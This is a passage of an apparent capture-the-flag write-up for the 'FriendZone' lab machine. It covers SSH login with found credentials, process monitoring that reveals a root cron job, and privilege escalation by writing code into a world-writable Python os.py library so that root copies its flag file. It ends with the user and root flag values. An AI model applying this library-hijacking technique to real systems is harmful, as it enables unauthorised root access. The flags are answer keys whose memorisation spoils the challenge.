/var/cache/apache2/mod_cache_disk
/var/lib/php/sessions
/var/spool/samba
/var/tmp
```

```
-rwxrwxrwx  1 root   root    25910 Jan 15  2019 os.py
-rw-rw-r--  1 friend friend  25583 Jan 15  2019 os.pyc
```

maybe we do need to get to `friend`..

what's listening on `953`?

```
$ nc -v localhost 953
nc: connect to localhost port 953 (tcp) failed: Connection refused
Connection to localhost 953 port [tcp/*] succeeded!
?

HELO
```

ok, that's strange

also don't see mysql running, so maybe the creds mentioned are straight ssh?


```
$ ssh -l friend friendzone.htb
Warning: Permanently added 'friendzone.htb' (ED25519) to the list of known hosts.
friend@friendzone.htb's password:
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

You have mail.
Last login: Thu Jan 24 01:20:15 2019 from 10.10.14.3
friend@FriendZone:~$
```

indeed.

```
friend@FriendZone:~$ mail
No mail for friend
```

second time we've seen conflicting messages, it's like something is going on in the background, so.. pspy is probably the thing we need

linpeas didn't show us much new, so going that way

```
2023/03/19 01:28:01 CMD: UID=0    PID=31800  | /bin/sh -c /opt/server_admin/reporter.py
2023/03/19 01:28:01 CMD: UID=0    PID=31799  | /bin/sh -c /opt/server_admin/reporter.py
2023/03/19 01:28:01 CMD: UID=0    PID=31798  | /usr/sbin/CRON -f
```

almost right off the bat.. because we forgot to manually check `/opt` contents

```
$ cat /opt/server_admin/reporter.py
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```

and now we see why `os.py` is important. because the command is commented out and we don't have write access, presumably we need to poison some initialization that is caused by the import?

poisoned with

```python
import subprocess

subprocess.run(["cp", "/root/root.txt", "/tmp/root.txt"])
```

unfortunately, circular dependency:
```
friend@FriendZone:~$ python /opt/server_admin/reporter.py
Traceback (most recent call last):
  File "/usr/lib/python2.7/site.py", line 68, in <module>
    import os
  File "/usr/lib/python2.7/os.py", line 28, in <module>
    import subprocess
  File "/usr/lib/python2.7/subprocess.py", line 297, in <module>
    class Popen(object):
  File "/usr/lib/python2.7/subprocess.py", line 1050, in Popen
    def _handle_exitstatus(self, sts, _WIFSIGNALED=os.WIFSIGNALED,
AttributeError: 'module' object has no attribute 'WIFSIGNALED'

```

```python
import subprocess
subprocess.Popen(["cp", "/root/root.txt", "/tmp/root.txt"])
```

worked, to get
```
friend@FriendZone:~$ ls -l /tmp
total 20
-rw-r----- 1 root root   33 Mar 19 02:10 root.txt
```

unfortunately, had to reset the machine, and lost our access to the file

```
friend@FriendZone:~$ ls -l /tmp
total 24
-rw-rw-r-- 1 friend friend   33 Mar 19 02:12 root2.txt
-rw-r----- 1 root   root     33 Mar 19 02:10 root.txt
drwx------ 3 root   root   4096 Mar 19 02:08 systemd-private-42ee092db1a340a0a4cd326de4ffd8bb-apache2.service-Hjbba8
drwx------ 3 root   root   4096 Mar 19 02:08 systemd-private-42ee092db1a340a0a4cd326de4ffd8bb-systemd-resolved.service-TBwOrF
drwx------ 3 root   root   4096 Mar 19 02:08 systemd-private-42ee092db1a340a0a4cd326de4ffd8bb-systemd-timesyncd.service-xI3hz6
drwx------ 2 root   root   4096 Mar 19 02:08 vmware-root_220-860594501
friend@FriendZone:~$ cat /tmp/root2.txt
fc1b599c5ea0063415dcc163b412f8fc
```

there we go

## flag
```
user:0ee5a07e71eac460cab9879e13eddbc8
root:fc1b599c5ea0063415dcc163b412f8fc
```

